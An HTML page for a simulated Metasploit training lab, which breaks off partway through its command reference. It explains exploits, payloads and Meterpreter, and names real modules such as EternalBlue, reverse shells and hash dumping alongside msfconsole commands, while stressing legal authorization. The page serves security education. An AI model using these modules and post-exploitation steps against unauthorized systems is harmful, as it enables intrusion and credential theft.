<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Metasploit Training Lab - Dark Arts Vault | Hexworth Prime</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a0a1a 0%, #2d0a2d 100%);
            min-height: 100vh;
            padding: 20px;
            color: #e0e0e0;
        }

        .container {
            max-width: 1600px;
            margin: 0 auto;
            background: rgba(15, 10, 30, 0.95);
            border-radius: 15px;
            box-shadow: 0 10px 50px rgba(0, 0, 0, 0.5);
            overflow: hidden;
            border: 2px solid rgba(79, 70, 229, 0.3);
        }

        .header {
            background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
            padding: 30px;
            text-align: center;
            border-bottom: 3px solid #6366f1;
        }

        .header h1 {
            color: #ffffff;
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }

        .header p {
            color: #e0e0f1;
            font-size: 1.1em;
        }

        .disclaimer {
            background: rgba(239, 68, 68, 0.15);
            border: 2px solid #ef4444;
            border-radius: 8px;
            padding: 15px;
            margin-top: 15px;
            font-size: 0.9em;
            color: #fca5a5;
        }

        .disclaimer strong {
            color: #f87171;
            display: block;
            margin-bottom: 5px;
        }

        .back-link {
            display: inline-block;
            margin-top: 15px;
            padding: 10px 20px;
            background: rgba(255, 255, 255, 0.2);
            color: white;
            text-decoration: none;
            border-radius: 8px;
            transition: all 0.3s ease;
            border: 2px solid rgba(255, 255, 255, 0.3);
        }

        .back-link:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: translateY(-2px);
        }

        .main-content {
            display: grid;
            grid-template-columns: 1fr 380px;
            gap: 0;
            min-height: calc(100vh - 200px);
        }

        .workspace {
            display: flex;
            flex-direction: column;
            border-right: 2px solid rgba(79, 70, 229, 0.3);
        }

        .tab-container {
            display: flex;
            background: rgba(15, 10, 30, 0.9);
            border-bottom: 2px solid rgba(79, 70, 229, 0.3);
            padding: 10px 20px 0;
            gap: 5px;
            flex-wrap: wrap;
        }

        .tab {
            padding: 12px 20px;
            background: rgba(79, 70, 229, 0.3);
            color: #a5b4fc;
            border: none;
            cursor: pointer;
            border-radius: 10px 10px 0 0;
            transition: all 0.3s ease;
            font-size: 0.95em;
            font-weight: 500;
            border: 2px solid transparent;
            border-bottom: none;
        }

        .tab:hover {
            background: rgba(79, 70, 229, 0.5);
            color: #e0e0e0;
        }

        .tab.active {
            background: rgba(79, 70, 229, 0.7);
            color: #ffffff;
            border-color: #6366f1;
        }

        .tab-content {
            display: none;
            flex: 1;
            overflow: hidden;
            flex-direction: column;
        }

        .tab-content.active {
            display: flex;
        }

        /* Learn Tab Styles */
        .learn-content {
            flex: 1;
            padding: 30px;
            overflow-y: auto;
        }

        .learn-section {
            margin-bottom: 30px;
        }

        .learn-section h2 {
            color: #6366f1;
            font-size: 1.8em;
            margin-bottom: 15px;
            border-bottom: 2px solid #4f46e5;
            padding-bottom: 10px;
        }

        .learn-section h3 {
            color: #818cf8;
            font-size: 1.3em;
            margin: 20px 0 10px;
        }

        .learn-section p {
            line-height: 1.8;
            margin-bottom: 15px;
            color: #d0d0d0;
        }

        .learn-section ul, .learn-section ol {
            margin-left: 25px;
            margin-bottom: 15px;
        }

        .learn-section li {
            line-height: 1.8;
            margin-bottom: 8px;
            color: #d0d0d0;
        }

        .info-box {
            background: rgba(79, 70, 229, 0.15);
            border-left: 4px solid #6366f1;
            padding: 15px 20px;
            margin: 15px 0;
            border-radius: 0 8px 8px 0;
        }

        .info-box.warning {
            background: rgba(251, 146, 60, 0.15);
            border-left-color: #fb923c;
        }

        .info-box.danger {
            background: rgba(239, 68, 68, 0.15);
            border-left-color: #ef4444;
        }

        .info-box.success {
            background: rgba(34, 197, 94, 0.15);
            border-left-color: #22c55e;
        }

        .info-box strong {
            color: #6366f1;
            display: block;
            margin-bottom: 5px;
        }

        .info-box.warning strong {
            color: #fb923c;
        }

        .info-box.danger strong {
            color: #ef4444;
        }

        .info-box.success strong {
            color: #22c55e;
        }

        code {
            background: rgba(79, 70, 229, 0.3);
            padding: 2px 8px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            color: #a5b4fc;
        }

        .code-block {
            background: rgba(0, 0, 0, 0.6);
            padding: 15px 20px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            margin: 15px 0;
            overflow-x: auto;
            border: 1px solid rgba(79, 70, 229, 0.3);
        }

        .code-block .comment {
            color: #6b7280;
        }

        .code-block .command {
            color: #22c55e;
        }

        .code-block .module {
            color: #60a5fa;
        }

        .code-block .payload {
            color: #f472b6;
        }

        .code-block .option {
            color: #fbbf24;
        }

        /* Console Lab Styles */
        .console-lab {
            flex: 1;
            display: flex;
            flex-direction: column;
            background: rgba(0, 0, 0, 0.7);
        }

        .console-toolbar {
            background: rgba(79, 70, 229, 0.2);
            padding: 15px 20px;
            border-bottom: 2px solid rgba(79, 70, 229, 0.3);
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .console-toolbar label {
            color: #a5b4fc;
            font-weight: 600;
        }

        .console-toolbar button {
            padding: 8px 15px;
            background: rgba(79, 70, 229, 0.3);
            border: 2px solid #6366f1;
            color: #a5b4fc;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 0.9em;
        }

        .console-toolbar button:hover {
            background: rgba(79, 70, 229, 0.5);
            color: #ffffff;
        }

        .terminal {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
            font-family: 'Courier New', monospace;
            font-size: 0.95em;
            color: #22c55e;
        }

        .terminal-output {
            margin-bottom: 10px;
            line-height: 1.6;
        }

        .terminal-output.error {
            color: #ef4444;
        }

        .terminal-output.info {
            color: #60a5fa;
        }

        .terminal-output.success {
            color: #22c55e;
        }

        .terminal-output.warning {
            color: #fbbf24;
        }

        .prompt {
            color: #6366f1;
            font-weight: bold;
        }

        .input-line {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-top: 10px;
        }

        #commandInput {
            flex: 1;
            background: rgba(0, 0, 0, 0.6);
            border: 2px solid rgba(79, 70, 229, 0.5);
            color: #22c55e;
            padding: 10px 15px;
            border-radius: 6px;
            font-family: 'Courier New', monospace;
            font-size: 0.95em;
        }

        #commandInput:focus {
            outline: none;
            border-color: #6366f1;
            box-shadow: 0 0 10px rgba(79, 70, 229, 0.3);
        }

        /* Challenges Styles */
        .challenges-container {
            flex: 1;
            padding: 30px;
            overflow-y: auto;
        }

        .challenge-card {
            background: rgba(0, 0, 0, 0.4);
            border-left: 4px solid #6366f1;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 0 8px 8px 0;
            transition: all 0.3s ease;
        }

        .challenge-card:hover {
            background: rgba(79, 70, 229, 0.1);
        }

        .challenge-card.completed {
            border-left-color: #22c55e;
            background: rgba(34, 197, 94, 0.1);
        }

        .challenge-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }

        .challenge-title {
            color: #a5b4fc;
            font-size: 1.1em;
            font-weight: 600;
        }

        .challenge-card.completed .challenge-title {
            color: #22c55e;
        }

        .challenge-status {
            padding: 5px 12px;
            background: rgba(79, 70, 229, 0.3);
            border: 1px solid #6366f1;
            border-radius: 15px;
            font-size: 0.85em;
            color: #a5b4fc;
        }

        .challenge-card.completed .challenge-status {
            background: rgba(34, 197, 94, 0.3);
            border-color: #22c55e;
            color: #22c55e;
        }

        .challenge-description {
            color: #d0d0d0;
            line-height: 1.6;
            margin-bottom: 15px;
        }

        .challenge-hint {
            background: rgba(251, 146, 60, 0.15);
            border-left: 3px solid #fb923c;
            padding: 10px 15px;
            margin-top: 10px;
            border-radius: 0 6px 6px 0;
            font-size: 0.9em;
            color: #fed7aa;
        }

        .challenge-input {
            display: flex;
            gap: 10px;
            margin-top: 15px;
        }

        .challenge-input input {
            flex: 1;
            background: rgba(0, 0, 0, 0.6);
            border: 2px solid rgba(79, 70, 229, 0.3);
            color: #22c55e;
            padding: 10px 15px;
            border-radius: 6px;
            font-family: 'Courier New', monospace;
        }

        .challenge-input input:focus {
            outline: none;
            border-color: #6366f1;
        }

        .challenge-input button {
            padding: 10px 20px;
            background: linear-gradient(135deg, #6366f1 0%, #4f46e5 100%);
            border: none;
            color: white;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s ease;
        }

        .challenge-input button:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(79, 70, 229, 0.4);
        }

        /* Reference Styles */
        .reference-container {
            flex: 1;
            padding: 30px;
            overflow-y: auto;
        }

        .ref-category {
            margin-bottom: 30px;
        }

        .ref-category h3 {
            color: #6366f1;
            font-size: 1.3em;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 2px solid rgba(79, 70, 229, 0.3);
        }

        .ref-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 15px;
        }

        .ref-item {
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(79, 70, 229, 0.3);
            padding: 15px;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .ref-item:hover {
            background: rgba(79, 70, 229, 0.2);
            border-color: #6366f1;
            transform: translateY(-2px);
        }

        .command-syntax {
            font-family: 'Courier New', monospace;
            color: #22c55e;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .command-explanation {
            color: #a5b4fc;
            font-size: 0.9em;
            line-height: 1.5;
        }

        /* Settings Styles */
        .settings-container {
            flex: 1;
            padding: 30px;
            overflow-y: auto;
        }

        .settings-section {
            background: rgba(0, 0, 0, 0.4);
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            border: 1px solid rgba(79, 70, 229, 0.3);
        }

        .settings-section h3 {
            color: #6366f1;
            margin-bottom: 15px;
        }

        .settings-btn {
            padding: 12px 25px;
            background: linear-gradient(135deg, #6366f1 0%, #4f46e5 100%);
            border: none;
            color: white;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 600;
            margin-right: 10px;
            margin-bottom: 10px;
            transition: all 0.3s ease;
        }

        .settings-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(79, 70, 229, 0.4);
        }

        .settings-btn.secondary {
            background: rgba(79, 70, 229, 0.2);
            border: 2px solid #6366f1;
        }

        /* Sidebar Styles */
        .sidebar {
            background: rgba(0, 0, 0, 0.5);
            padding: 20px;
            overflow-y: auto;
        }

        .sidebar-section {
            margin-bottom: 25px;
        }

        .sidebar-section h3 {
            color: #6366f1;
            font-size: 1.1em;
            margin-bottom: 12px;
            padding-bottom: 8px;
            border-bottom: 2px solid rgba(79, 70, 229, 0.3);
        }

        .sidebar-section p {
            color: #d0d0d0;
            font-size: 0.9em;
            line-height: 1.6;
            margin-bottom: 10px;
        }

        .stat-item {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid rgba(79, 70, 229, 0.2);
        }

        .stat-label {
            color: #a5b4fc;
            font-size: 0.9em;
        }

        .stat-value {
            color: #6366f1;
            font-weight: 600;
        }

        .learning-tip {
            background: rgba(34, 197, 94, 0.1);
            border: 1px solid #22c55e;
            padding: 12px;
            border-radius: 6px;
            margin-top: 10px;
        }

        .learning-tip strong {
            color: #22c55e;
            display: block;
            margin-bottom: 5px;
            font-size: 0.9em;
        }

        .learning-tip p {
            color: #d0d0d0;
            font-size: 0.85em;
            line-height: 1.5;
        }

        /* Progress tracker */
        .progress-section {
            background: rgba(0, 0, 0, 0.4);
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
        }

        .progress-bar-container {
            background: rgba(79, 70, 229, 0.2);
            border-radius: 10px;
            height: 20px;
            overflow: hidden;
            margin: 10px 0;
        }

        .progress-bar {
            background: linear-gradient(90deg, #22c55e 0%, #6366f1 100%);
            height: 100%;
            border-radius: 10px;
            transition: width 0.5s ease;
        }

        .progress-text {
            display: flex;
            justify-content: space-between;
            font-size: 0.85em;
            color: #888;
        }

        /* Responsive */
        @media (max-width: 1200px) {
            .main-content {
                grid-template-columns: 1fr;
            }
            .sidebar {
                border-left: none;
                border-top: 2px solid rgba(79, 70, 229, 0.3);
                max-height: 350px;
            }
        }

        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 10px;
            height: 10px;
        }

        ::-webkit-scrollbar-track {
            background: rgba(15, 10, 30, 0.5);
        }

        ::-webkit-scrollbar-thumb {
            background: rgba(79, 70, 229, 0.5);
            border-radius: 5px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #6366f1;
        }

        /* Animations */
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }

        .cursor {
            animation: blink 1s infinite;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Metasploit Framework Training Lab</h1>
            <p>Master Penetration Testing Methodology Through Simulation</p>
            <div class="disclaimer">
                <strong>EDUCATIONAL USE ONLY - AUTHORIZED TESTING REQUIRED</strong>
                <p>This simulator teaches Metasploit concepts and workflow WITHOUT providing actual exploitation capabilities. Real-world penetration testing requires written authorization, adherence to rules of engagement, and legal compliance. Unauthorized access to computer systems is illegal and unethical.</p>
            </div>
            <a href="../index.html" class="back-link">‚Üê Back to Dark Arts Vault</a>
        </div>

        <div class="main-content">
            <div class="workspace">
                <div class="tab-container">
                    <button class="tab active" onclick="switchTab('learn')">üìö Learn</button>
                    <button class="tab" onclick="switchTab('console-lab')">üíª Console Lab</button>
                    <button class="tab" onclick="switchTab('challenges')">üéØ Challenges</button>
                    <button class="tab" onclick="switchTab('reference')">üìñ Reference</button>
                    <button class="tab" onclick="switchTab('settings')">‚öôÔ∏è Settings</button>
                </div>

                <!-- LEARN TAB -->
                <div id="learn" class="tab-content active">
                    <div class="learn-content">
                        <div class="learn-section">
                            <h2>What is Metasploit Framework?</h2>
                            <p>Metasploit Framework is the world's most popular penetration testing platform. It provides a standardized workflow for discovering, exploiting, and validating vulnerabilities in systems, applications, and networks. Think of it as a <strong>"Swiss Army knife for ethical hackers"</strong> - a comprehensive toolkit that automates much of the manual work involved in penetration testing.</p>

                            <div class="info-box danger">
                                <strong>‚ö†Ô∏è CRITICAL: Legal and Ethical Use Only</strong>
                                <p>Metasploit is a powerful tool that MUST ONLY be used on systems you own or have explicit written authorization to test. Unauthorized access to computer systems is a serious crime punishable by law. This lab teaches concepts and methodology - NOT how to attack real systems.</p>
                            </div>

                            <h3>Why Do We Need Metasploit?</h3>
                            <ul>
                                <li><strong>Vulnerability Validation:</strong> Prove that a discovered vulnerability is actually exploitable</li>
                                <li><strong>Penetration Testing:</strong> Simulate real-world attacks to assess security posture</li>
                                <li><strong>Security Research:</strong> Develop and test new exploit techniques safely</li>
                                <li><strong>Red Team Operations:</strong> Test organizational defenses with realistic adversarial scenarios</li>
                                <li><strong>Post-Exploitation:</strong> Assess damage potential once a system is compromised</li>
                            </ul>

                            <h3>The Penetration Testing Lifecycle</h3>
                            <ol>
                                <li><strong>Reconnaissance:</strong> Gather information about the target (passive and active)</li>
                                <li><strong>Scanning & Enumeration:</strong> Identify live hosts, open ports, and running services</li>
                                <li><strong>Vulnerability Analysis:</strong> Detect potential security weaknesses</li>
                                <li><strong>Exploitation:</strong> Attempt to gain access using discovered vulnerabilities</li>
                                <li><strong>Post-Exploitation:</strong> Maintain access, escalate privileges, pivot to other systems</li>
                                <li><strong>Reporting:</strong> Document findings and recommend remediation</li>
                            </ol>

                            <div class="info-box">
                                <strong>üéØ Key Concept</strong>
                                <p>Metasploit primarily assists with phases 4 (Exploitation) and 5 (Post-Exploitation). It's not a complete solution - you still need reconnaissance, scanning, and vulnerability assessment tools like Nmap, Nessus, or OpenVAS.</p>
                            </div>
                        </div>

                        <div class="learn-section">
                            <h2>Metasploit Architecture</h2>
                            <p>Understanding Metasploit's modular architecture is essential. Each module type serves a specific purpose in the testing workflow.</p>

                            <h3>1. Exploits</h3>
                            <p>Exploits are pieces of code that take advantage of a vulnerability to compromise a target system. They leverage flaws in software, configurations, or protocols to gain unauthorized access.</p>
                            <div class="code-block">
                                <span class="module">exploit/windows/smb/ms17_010_eternalblue</span>   <span class="comment"># Exploits SMB vulnerability</span><br>
                                <span class="module">exploit/multi/handler</span>                      <span class="comment"># Generic payload handler</span><br>
                                <span class="module">exploit/linux/http/apache_mod_cgi_bash_env_exec</span>  <span class="comment"># Shellshock</span>
                            </div>

                            <h3>2. Payloads</h3>
                            <p>Payloads are the code that runs on the target system AFTER exploitation succeeds. They define what you want to do once you have access.</p>
                            <div class="code-block">
                                <span class="payload">windows/meterpreter/reverse_tcp</span>    <span class="comment"># Meterpreter shell (Windows)</span><br>
                                <span class="payload">linux/x64/shell/reverse_tcp</span>        <span class="comment"># Command shell (Linux)</span><br>
                                <span class="payload">cmd/unix/reverse_python</span>            <span class="comment"># Python-based reverse shell</span>
                            </div>

                            <div class="info-box warning">
                                <strong>‚ö†Ô∏è Common Confusion: Exploit vs Payload</strong>
                                <p><strong>Exploit:</strong> The delivery mechanism - HOW you get in (exploits a vulnerability)<br>
                                <strong>Payload:</strong> What you do once inside - WHAT you want to run on the target<br><br>
                                Analogy: The exploit is the key that unlocks the door. The payload is what you do once you're inside the house.</p>
                            </div>

                            <h3>3. Auxiliary Modules</h3>
                            <p>Auxiliary modules perform supporting tasks that don't directly exploit vulnerabilities but assist in reconnaissance, scanning, and information gathering.</p>
                            <div class="code-block">
                                <span class="module">auxiliary/scanner/portscan/tcp</span>       <span class="comment"># TCP port scanner</span><br>
                                <span class="module">auxiliary/scanner/smb/smb_version</span>    <span class="comment"># SMB version detection</span><br>
                                <span class="module">auxiliary/scanner/http/http_version</span>  <span class="comment"># Web server fingerprinting</span>
                            </div>

                            <h3>4. Post-Exploitation Modules</h3>
                            <p>These modules run AFTER you've already compromised a system. They help with privilege escalation, lateral movement, data collection, and maintaining persistence.</p>
                            <div class="code-block">
                                <span class="module">post/windows/gather/hashdump</span>         <span class="comment"># Extract password hashes</span><br>
                                <span class="module">post/multi/recon/local_exploit_suggester</span>  <span class="comment"># Find privilege escalation paths</span><br>
                                <span class="module">post/windows/manage/migrate</span>          <span class="comment"># Move to different process</span>
                            </div>
                        </div>

                        <div class="learn-section">
                            <h2>Understanding msfconsole</h2>
                            <p>The <code>msfconsole</code> is Metasploit's primary command-line interface. It provides an interactive environment for selecting modules, configuring options, and launching attacks.</p>

                            <h3>Basic Navigation Commands</h3>
                            <div class="code-block">
                                <span class="command">help</span>                    <span class="comment"># Show all available commands</span><br>
                                <span class="command">search</span> [keyword]        <span class="comment"># Search for modules</span><br>
                                <span class="command">use</span> [module_path]       <span class="comment"># Select a module to use</span><br>
                                <span class="command">info</span>                    <span class="comment"># Show detailed information about current module</span><br>
                                <span class="command">show options</span>            <span class="comment"># Display configurable options</span><br>
                                <span class="command">show payloads</span>           <span class="comment"># List compatible payloads</span><br>
                                <span class="command">set</span> [option] [value]    <span class="comment"># Configure an option</span><br>
                                <span class="command">exploit</span> or <span class="command">run</span>       <span class="comment"># Execute the module</span><br>
                                <span class="command">back</span>                    <span class="comment"># Return to main console</span><br>
                                <span class="command">exit</span>                    <span class="comment"># Quit msfconsole</span>
                            </div>

                            <h3>Searching for Modules</h3>
                            <div class="code-block">
                                <span class="command">search</span> smb               <span class="comment"># Search for SMB-related modules</span><br>
                                <span class="command">search</span> type:exploit platform:windows  <span class="comment"># Filter by type and platform</span><br>
                                <span class="command">search</span> cve:2017 rank:excellent        <span class="comment"># Search by CVE and reliability rank</span>
                            </div>

                            <div class="info-box success">
                                <strong>‚úÖ Pro Tip: Module Ranks</strong>
                                <p>Modules are ranked by reliability: <strong>Excellent</strong> > Great > Good > Normal > Average > Low > Manual. Always prefer "Excellent" or "Great" ranked modules for real engagements.</p>
                            </div>
                        </div>

                        <div class="learn-section">
                            <h2>Stages vs Stagers (Advanced Concept)</h2>
                            <p>Payload names like <code>windows/meterpreter/reverse_tcp</code> contain important information about how the payload is delivered.</p>

                            <h3>Staged Payloads (has a slash /)</h3>
                            <p>Example: <code>windows/meterpreter/reverse_tcp</code></p>
                            <ul>
                                <li><strong>Two-stage delivery:</strong> First, a small "stager" is sent (stage 0)</li>
                                <li>The stager then downloads the full payload (stage 1) from the attacker</li>
                                <li><strong>Advantage:</strong> Smaller initial payload, better for tight size restrictions</li>
                                <li><strong>Disadvantage:</strong> Requires stable connection for second stage download</li>
                            </ul>

                            <h3>Stageless Payloads (has an underscore _)</h3>
                            <p>Example: <code>windows/meterpreter_reverse_tcp</code></p>
                            <ul>
                                <li><strong>Single-stage delivery:</strong> Entire payload sent at once</li>
                                <li><strong>Advantage:</strong> More stable, no second connection needed, works with IDS/firewall evasion</li>
                                <li><strong>Disadvantage:</strong> Larger size, may not fit in exploits with size constraints</li>
                            </ul>

                            <div class="info-box">
                                <strong>üéØ When to Use Each</strong>
                                <p><strong>Staged:</strong> Tight space constraints, reliable network<br>
                                <strong>Stageless:</strong> Unstable networks, restrictive firewalls, need reliability</p>
                            </div>
                        </div>

                        <div class="learn-section">
                            <h2>Meterpreter: The Power Tool</h2>
                            <p>Meterpreter is Metasploit's advanced payload that provides a powerful post-exploitation platform. Unlike a simple shell, Meterpreter runs entirely in memory and offers sophisticated capabilities.</p>

                            <h3>Why Meterpreter is Special</h3>
                            <ul>
                                <li><strong>Memory Resident:</strong> Runs in RAM, doesn't write to disk (harder to detect)</li>
                                <li><strong>Encrypted Communication:</strong> All traffic is encrypted by default</li>
                                <li><strong>Extensible:</strong> Load additional modules on-the-fly</li>
                                <li><strong>Cross-Platform:</strong> Works on Windows, Linux, macOS, Android</li>
                            </ul>

                            <h3>Essential Meterpreter Commands</h3>
                            <div class="code-block">
                                <span class="command">sysinfo</span>                <span class="comment"># Display system information</span><br>
                                <span class="command">getuid</span>                 <span class="comment"># Show current user</span><br>
                                <span class="command">ps</span>                     <span class="comment"># List running processes</span><br>
                                <span class="command">migrate</span> [PID]          <span class="comment"># Move to another process (for persistence)</span><br>
                                <span class="command">hashdump</span>               <span class="comment"># Dump password hashes</span><br>
                                <span class="command">screenshot</span>             <span class="comment"># Capture screen</span><br>
                                <span class="command">download</span> [remote] [local]  <span class="comment"># Download files</span><br>
                                <span class="command">upload</span> [local] [remote]    <span class="comment"># Upload files</span><br>
                                <span class="command">shell</span>                  <span class="comment"># Drop into system shell</span><br>
                                <span class="command">background</span>             <span class="comment"># Background current session</span>
                            </div>
                        </div>

                        <div class="learn-section">
                            <h2>Rules of Engagement and Ethics</h2>

                            <div class="info-box danger">
                                <strong>üö® MANDATORY REQUIREMENTS</strong>
                                <p>Before conducting ANY penetration testing with Metasploit:</p>
                            </div>

                            <ol>
                                <li><strong>Written Authorization:</strong> Obtain explicit, signed permission from the system owner</li>
                                <li><strong>Scope Definition:</strong> Clearly define which systems, networks, and timeframes are in-scope</li>
                                <li><strong>Rules of Engagement (ROE):</strong> Document what actions are permitted and prohibited</li>
                                <li><strong>Emergency Contacts:</strong> Have escalation procedures if something goes wrong</li>
                                <li><strong>Legal Review:</strong> Ensure compliance with applicable laws and regulations</li>
                            </ol>

                            <h3>What Can Go Wrong</h3>
                            <ul>
                                <li>Exploits can crash systems and cause downtime</li>
                                <li>Production data could be corrupted or lost</li>
                                <li>Network performance may be impacted</li>
                                <li>Security tools may trigger, alerting defenders</li>
                                <li>Legal liability if authorization is unclear</li>
                            </ul>

                            <div class="info-box warning">
                                <strong>‚öñÔ∏è Legal Consequences</strong>
                                <p>In the United States, unauthorized access to computer systems violates the Computer Fraud and Abuse Act (CFAA) and can result in criminal charges, fines up to $250,000, and imprisonment up to 20 years for repeat offenses. Other countries have similar laws.</p>
                            </div>

                            <h3>Ethical Testing Principles</h3>
                            <ul>
                                <li><strong>Confidentiality:</strong> Protect client data and findings</li>
                                <li><strong>Integrity:</strong> Report all findings accurately, including those that don't favor your conclusions</li>
                                <li><strong>Professionalism:</strong> Conduct tests during agreed timeframes with minimal disruption</li>
                                <li><strong>Due Care:</strong> Take precautions to avoid causing damage</li>
                                <li><strong>Disclosure:</strong> Provide clients with actionable remediation guidance</li>
                            </ul>
                        </div>

                        <div class="learn-section">
                            <h2>Ready to Practice?</h2>
                            <p>Head to the <strong>Console Lab</strong> tab to practice Metasploit commands in a safe, simulated environment. Then test your skills in the <strong>Challenges</strong> section!</p>

                            <div class="info-box success">
                                <strong>üéÆ Safe Learning Environment</strong>
                                <p>The Console Lab provides a simulated msfconsole with educational responses. No actual exploitation occurs - you're learning the workflow and command structure safely.</p>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- CONSOLE LAB TAB -->
                <div id="console-lab" class="tab-content">
                    <div class="console-lab">
                        <div class="console-toolbar">
                            <label>Simulated msfconsole Environment</label>
                            <button onclick="clearTerminal()">Clear Terminal</button>
                            <button onclick="loadScenario('beginner')">Load Beginner Scenario</button>
                            <button onclick="loadScenario('advanced')">Load Advanced Scenario</button>
                        </div>

                        <div class="terminal" id="terminal">
                            <div class="terminal-output">
                                <pre style="color: #6366f1; line-height: 1.4;">
       =[ metasploit v6.3.45-dev                          ]
+ -- --=[ 2376 exploits - 1234 auxiliary - 413 post       ]
+ -- --=[ 1388 payloads - 46 encoders - 11 nops          ]
+ -- --=[ 9 evasion                                       ]
                                </pre>
                            </div>
                            <div class="terminal-output info">Metasploit tip: Use the 'search' command to find modules by keyword, CVE, or platform.</div>
                            <div class="terminal-output warning">‚ö†Ô∏è  EDUCATIONAL SIMULATOR - No actual exploitation occurs in this lab</div>
                            <div class="terminal-output">Type 'help' for available commands or try: <span style="color: #22c55e;">search smb</span></div>
                        </div>

                        <div class="input-line" style="padding: 20px; border-top: 2px solid rgba(79, 70, 229, 0.3);">
                            <span class="prompt">msf6 ></span>
                            <input type="text" id="commandInput" placeholder="Enter command..." autocomplete="off" spellcheck="false">
                        </div>
                    </div>
                </div>

                <!-- CHALLENGES TAB -->
                <div id="challenges" class="tab-content">
                    <div class="challenges-container">
                        <div class="progress-section">
                            <h3 style="color: #6366f1; margin-bottom: 10px;">Your Progress</h3>
                            <div class="progress-bar-container">
                                <div class="progress-bar" id="progressBar" style="width: 0%;"></div>
                            </div>
                            <div class="progress-text">
                                <span><span id="completedCount">0</span> of <span id="totalChallenges">10</span> challenges completed</span>
                                <span id="totalPoints">0 points</span>
                            </div>
                        </div>

                        <div id="challengeList"></div>
                    </div>
                </div>

                <!-- REFERENCE TAB -->
                <div id="reference" class="tab-content">
                    <div class="reference-container">
                        <div class="ref-category">
                            <h3>üîç Search Commands</h3>
                            <div class="ref-grid">
                                <div class="ref-item" onclick="insertCommand('search ')">
                                    <div class="command-syntax">search [keyword]</div>
                                    <div class="command-explanation">Search for modules by keyword</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('search type:exploit ')">
                                    <div class="command-syntax">search type:exploit [keyword]</div>
                                    <div class="command-explanation">Search only exploit modules</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('search platform:windows ')">
                                    <div class="command-syntax">search platform:windows</div>
                                    <div class="command-explanation">Search by target platform</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('search cve:2017')">
                                    <div class="command-syntax">search cve:YYYY</div>
                                    <div class="command-explanation">Search by CVE year</div>
                                </div>
                            </div>
                        </div>

                        <div class="ref-category">
                            <h3>üéØ Module Selection</h3>
                            <div class="ref-grid">
                                <div class="ref-item" onclick="insertCommand('use exploit/windows/smb/ms17_010_eternalblue')">
                                    <div class="command-syntax">use [module_path]</div>
                                    <div class="command-explanation">Select a module to configure</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('info')">
                                    <div class="command-syntax">info</div>
                                    <div class="command-explanation">Show detailed module information</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('show options')">
                                    <div class="command-syntax">show options</div>
                                    <div class="command-explanation">Display configurable options</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('show payloads')">
                                    <div class="command-syntax">show payloads</div>
                                    <div class="command-explanation">List compatible payloads</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('show targets')">
                                    <div class="command-syntax">show targets</div>
                                    <div class="command-explanation">Display available target versions</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('back')">
                                    <div class="command-syntax">back</div>
                                    <div class="command-explanation">Return to main msfconsole prompt</div>
                                </div>
                            </div>
                        </div>

                        <div class="ref-category">
                            <h3>‚öôÔ∏è Configuration</h3>
                            <div class="ref-grid">
                                <div class="ref-item" onclick="insertCommand('set RHOSTS ')">
                                    <div class="command-syntax">set RHOSTS [target]</div>
                                    <div class="command-explanation">Set remote target host(s)</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('set LHOST ')">
                                    <div class="command-syntax">set LHOST [attacker_ip]</div>
                                    <div class="command-explanation">Set local (attacker) IP address</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('set LPORT ')">
                                    <div class="command-syntax">set LPORT [port]</div>
                                    <div class="command-explanation">Set local listening port</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('set PAYLOAD ')">
                                    <div class="command-syntax">set PAYLOAD [payload_path]</div>
                                    <div class="command-explanation">Choose what runs on target after exploit</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('setg LHOST ')">
                                    <div class="command-syntax">setg [option] [value]</div>
                                    <div class="command-explanation">Set global option (persists across modules)</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('unset ')">
                                    <div class="command-syntax">unset [option]</div>
                                    <div class="command-explanation">Clear an option value</div>
                                </div>
                            </div>
                        </div>

                        <div class="ref-category">
                            <h3>üöÄ Execution</h3>
                            <div class="ref-grid">
